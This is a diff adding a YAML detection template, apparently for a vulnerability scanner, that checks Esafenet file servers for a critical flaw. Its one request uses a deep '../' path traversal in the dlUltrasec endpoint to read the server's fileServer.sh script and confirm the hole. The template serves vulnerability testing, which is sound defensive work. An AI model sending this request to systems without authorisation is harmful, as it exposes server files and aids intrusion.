@@ -1,0 +1,17 @@
+name: yaml-poc-esafenet-esafenet_fileserver-rce-CT-1002008
+binding: 154d163c-ac58-4f65-893c-cbe590863c19
+detail:
+    author: yuxiang.cai
+    vulnerability:
+        id: 5e342f19-6c88-4f8f-8373-8fbc88728e51
+        level: critical
+    warning: Harmless
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /linuxUpdate/dlUltrasec?path=../../../../../../../../../esafenet/fileServer/fileServer.sh&type=1
+        expression: response.body_string.contains('fileServer.jar') && response.body_string.contains('/bin/bash')
+expression: r0()
